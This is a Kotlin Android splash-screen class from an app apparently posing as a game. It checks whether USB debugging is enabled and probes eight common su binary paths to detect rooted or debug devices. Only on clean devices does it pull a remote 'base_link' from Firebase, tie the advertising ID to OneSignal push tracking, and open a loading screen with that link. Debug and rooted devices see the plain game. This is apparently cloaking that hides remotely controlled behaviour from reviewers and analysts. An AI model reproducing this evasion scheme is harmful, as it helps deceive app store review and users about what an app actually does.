package com.lilithgame.hgame.g.screens

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import java.io.File

@SuppressLint("CustomSplashScreen")
class WolfMoonSplashScreen : AppCompatActivity() {
    private val secured by lazy { isSecureADB && isSecureFS }
    private val isSecureADB by lazy {
        Settings.Global.getString(this.contentResolver, Settings.Global.ADB_ENABLED) != "1"
    }
    private val isSecureFS by lazy {
        try {
            val files = setOf(
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su"
            )
            var result = true
            files.forEach { result = result && !File(it).exists() }
            result
        } catch (e: SecurityException) {
            true
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (secured) {
            Firebase.database.reference
                .addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val appsID = snapshot.child("apps_id").value as String
                        val baseLink = snapshot.child("base_link").value as String
                        val oneSignalID = snapshot.child("one_signal_id").value as String
                        val adId = lifecycleScope.async(Dispatchers.IO) {
                            AdvertisingIdClient.getAdvertisingIdInfo(
                                applicationContext
                            ).id.toString()
                        }

                        lifecycleScope.launch(Dispatchers.IO) {
                            OneSignal.setAppId(oneSignalID)
                            OneSignal.initWithContext(applicationContext)
                            OneSignal.setExternalUserId(adId.await())

                            val loadingScreenIntent = Intent(
                                this@WolfMoonSplashScreen,
                                WolfMoonLoadingScreen::class.java
                            )
                            with(loadingScreenIntent) {
                                putExtra(EXTRA_APPS_ID, appsID)
                                putExtra(EXTRA_BASE_LINK_DATA, baseLink)
                                putExtra(EXTRA_AD_ID, adId.await())
                                startActivity(this)
                                finish()
                            }
                        }
                    }

                    override fun onCancelled(error: DatabaseError) {
                        throw Error(error.message)
                    }
                })
        } else {
            startActivity(Intent(this, WolfMoonGameScreen::class.java))
            finish()
        }
    }

    companion object {
        const val EXTRA_APPS_ID = "apps_id_extra"
        const val EXTRA_BASE_LINK_DATA = "base_link_extra"
        const val EXTRA_LINK_DATA = "link_extra"
        const val EXTRA_AD_ID = "ad_id_extra"
    }
}